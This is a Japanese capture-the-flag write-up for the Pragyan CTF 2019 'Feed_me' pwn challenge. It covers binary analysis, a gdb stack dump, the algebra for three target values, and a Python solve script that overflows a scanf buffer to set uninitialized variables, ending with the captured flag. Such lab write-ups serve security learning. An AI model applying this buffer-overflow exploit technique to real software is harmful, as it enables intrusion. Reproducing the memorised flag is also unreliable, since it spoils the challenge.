# [pwn 150pts] Feed_me - Pragyan CTF 2019
64ビットバイナリで，PIEやSSPも有効です．
```
$ checksec challenge1
[*] '/home/ptr/writeups/2019/PragyanCTF_2019/feed_me/challenge1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

~IDAで解析すると処理が面倒そうだったのでGhidraを使います．~
処理の概要は分かりましたが使いにくかったのでIDAで調べます．

最初に乱数を使って何か3つの値を計算し，その結果を表示します．
次にscanfで入力し，その後次のような処理をしています．
```c
char *px, *py;
for(cnt = 0; cnt < strlen(buf); cnt++) {
  if ((buf[cnt] > '/') && (buf[cnt]) <= '9') continue;
  if (buf[cnt] == '-') continue;
  puts("Invalid input :(");
  return 0;
}
int val = atoi(buf);
int x = atoi(px);
int y = atoi(py);
if ((val + x == r1) && (x + y == r2) && (y + val == r3)) {
  fd = fopen("flag.txt", "r");
  fgets(flag, 0x32, fd);
  printf("That's yummy.... Here is your gift:\n%s", flag);
} else {
  fail();
  return 0;
}
```
初期化されていない変数があるようですが，scanfでオーバーフローがあるので自由な値に変更できます．
また，数字と`-`は正しい入力として読み飛ばしてくれます．
gdbで見ると入力バッファと未初期化変数は次のような位置にあります．
```
gdb-peda$ x/32wx $rsp
0x7fffffffda10: 0x00000000      0x00000000      0x00000076      0x00000008
0x7fffffffda20: 0xffffd228      0xffffc47e      0xffffe5e6      0x00a98f1e
0x7fffffffda30: 0xffffdab0      0x00007fff      0xffffdac0      0x00007fff
0x7fffffffda40: 0x31310009      0x32323131      0xf7003232      0x00007fff
0x7fffffffda50: 0x00000076      0x00000000      0x00000000      0x00000000
0x7fffffffda60: 0x00000000      0x00000000      0x00f0b5ff      0x00000000
0x7fffffffda70: 0x00000001      0x00000000      0x55554d3d      0x00005555
0x7fffffffda80: 0xffffdab0      0x00007fff      0x00000000      0x00000000
gdb-peda$ x/4wx $rbp-0x64
0x7fffffffda4c: 0x00007fff      0x00000076      0x00000000      0x00000000
gdb-peda$ x/4wx $rbp-0x5a
0x7fffffffda56: 0x00000000      0x00000000      0x00000000      0x00000000
```
r1からr3は入力より低いアドレスにあるのでオーバーフローする心配はありません．

豆知識ですが，今回のようにsetbufが付いていないバイナリは次のようにすればローカルでもpwntoolsが使えます．
```
$ socat TCP-L:9800,reuseaddr,fork EXEC:"stdbuf -i 0 -o 0 -e 0 ./challenge1"
```

さて，今回の条件式は
```
val + x   = r1   ...1
x   + y   = r2   ...2
y   + val = r3   ...3
```
の3つです．
1式から3式を引くと，
```
x - y = r1 - r3   ...4
```
となります．
さらに2式と4式を足すと，
```
2x = r1 + r2 - r3
```
となります．
したがって，
```
x = (r1 + r2 - r3) / 2
y = r2 - x
val = r1 - x
```
となります．

解答コードは次のようになります．
```python
from ptrlib import *

sock = Socket("127.0.0.1", 9800)

sock.recvline()
r1 = int(sock.recvuntil(" ;").rstrip(b";"))
r2 = int(sock.recvuntil(" ;").rstrip(b";"))
r3 = int(sock.recvuntil(" ;").rstrip(b";"))
dump("(r1, r2, r3) = ({}, {}, {})".format(r1, r2, r3))

x = (r1 + r2 - r3) // 2
y = r2 - x
val = r1 - x

payload1 = str(val)
payload1 += "-" * (10 - len(payload1))
payload2 = str(x)
payload2 += "-" * (10 - len(payload2))
payload3 = str(y)
payload = payload1 + payload2 + payload3

_ = input()
sock.sendline(payload)

sock.interactive()
```

できました．
```
$ python solve.py
[+] Socket: Successfully connected to 127.0.0.1:9800
[ptrlib] (r1, r2, r3) = (-18996, -7850, -17166)

[ptrlib]$ 
That's yummy.... Here is your gift:
pctf{p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3}
```

# 感想
簡単なオーバーフロー問題ですね．
